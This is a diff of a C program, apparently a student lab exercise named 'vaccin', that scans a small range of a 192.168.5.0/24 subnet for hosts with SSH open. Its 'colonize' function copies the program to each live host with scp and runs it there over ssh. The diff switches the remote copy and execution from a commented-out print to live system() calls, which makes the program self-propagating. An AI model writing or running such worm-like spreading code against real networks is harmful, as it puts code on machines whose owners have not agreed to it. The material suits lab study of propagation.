@@ -1,4 +1,3 @@
-//compilation: gcc -O3 -Wall -W -Wstrict-prototypes -Werror vaccin_nom_prenom.c
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -8,17 +7,19 @@
 #include <arpa/inet.h>
 #include <fcntl.h>
 
-#define SOURCE_HOST_IP "192.168.5.0"
-#define MASK "255.255.255.0"
-#define SSH "/usr/bin/ssh -qq"
+
+#define SSH "/usr/bin/ssh -q"
 #define SCP "/usr/bin/scp -q -p"
-#define DEST_FILE "/home/dstevens/vaccin"
 #define port 22
 
-#define beginScanRange 6
-#define endScanRange 12
+#define SOURCE_HOST_IP "192.168.5.0"
+#define MASK "255.255.255.0"
+#define USER "kali"
+#define DEST_FILE "/home/kali/vaccin"
+#define BEGINSCAN 6
+#define ENDSCAN 12
 
-#define hostListSize (endScanRange-beginScanRange+1)
+#define HOSTLISTSIZE (ENDSCAN-BEGINSCAN+1)
 
 static int nbHost;
 
@@ -60,7 +61,7 @@ char* createIP(char* host_ip, int lastDigit)
     return IP;
 }
 
-int * scanNetwork(void)
+int* scanNetwork(void)
 {
     struct in_addr mask, sourceIP,hostIP;
     struct sockaddr_in sockHostIP;
@@ -68,22 +69,22 @@ int * scanNetwork(void)
     int sock,so_error;
     fd_set fdset;
     struct timeval tv;
-    static int localHostList [hostListSize];
+    static int localHostList [HOSTLISTSIZE];
     nbHost = 0;
 
-    initList(localHostList,hostListSize);
+    initList(localHostList,HOSTLISTSIZE);
     
     inet_aton(SOURCE_HOST_IP,&sourceIP);
     inet_aton(MASK,&mask);
     hostMask = sourceIP.s_addr & mask.s_addr;
 
-    printf("[DEBUG] Begin Network %s Scan between [%d,%d] on port: %d\n",SOURCE_HOST_IP,beginScanRange,endScanRange,port);
+    printf("[DEBUG] Begin Network %s Scan between [%d,%d] on port: %d\n",SOURCE_HOST_IP,BEGINSCAN,ENDSCAN,port);
 
-    for(i = beginScanRange; i < endScanRange; i++)
+    for(i = BEGINSCAN; i <= ENDSCAN; i++)
     {
         
         hostIP.s_addr = htonl(ntohl(hostMask)+i);
-        printf("[DEBUG] Test on: %s:%d\t",inet_ntoa(hostIP),port);
+        printf("[DEBUG] Test on: %s:%d",inet_ntoa(hostIP),port);
         fflush(stdout);
         bzero(&sockHostIP, sizeof(sockHostIP));
         sockHostIP.sin_addr = hostIP;
@@ -102,14 +103,15 @@ int * scanNetwork(void)
             socklen_t len = sizeof so_error;
             getsockopt(sock,SOL_SOCKET,SO_ERROR,&so_error,&len);
             if(so_error == 0){
-                printf("Alive\n");
+                printf(" Alive");
                 localHostList[nbHost] = i;
                 nbHost++;
             }
         }else
         {
-            printf("Dead\n");
+            printf(" Dead");
         }
+        printf("\n");
         close(sock);
         
     }
@@ -119,17 +121,33 @@ int * scanNetwork(void)
 void colonize(int *list, char src[])
 {
     char cmd[256];
-    char tmp[64];
 
     for(int i = 0; i < nbHost ; i++)
     {   
         char* actualIP = createIP(SOURCE_HOST_IP,list[i]);
+
         sprintf(cmd,SCP);
-        sprintf(tmp, " %s dstevens@%s:", src,actualIP);
-        strcat(cmd,tmp);
+        strcat(cmd," ");
+        strcat(cmd,src);
+        strcat(cmd," ");
+        strcat(cmd,USER);
+        strcat(cmd,"@");
+        strcat(cmd,actualIP);
+        strcat(cmd,":");
         strcat(cmd,DEST_FILE);
-        printf("%s\n", cmd);
-        //system(cmd);
+        printf("[DEBUG] %s\n", cmd);
+        system(cmd);
+        
+        sprintf(cmd,SSH);
+        strcat(cmd," ");
+        strcat(cmd,USER);
+        strcat(cmd,"@");
+        strcat(cmd,actualIP);
+        strcat(cmd," ");
+        strcat(cmd,DEST_FILE);                
+        printf("[DEBUG] %s\n", cmd);
+        system(cmd);
+
     }
     
 }
@@ -138,7 +156,7 @@ int main(int argc, char *argv[])
 {
     if(argc) printf("### %s\n", argv[0]);
 
-    int *hostList = (int*)malloc(hostListSize*sizeof(int));
+    int *hostList = (int*)malloc(HOSTLISTSIZE*sizeof(int));
 
     hostList = scanNetwork();
 
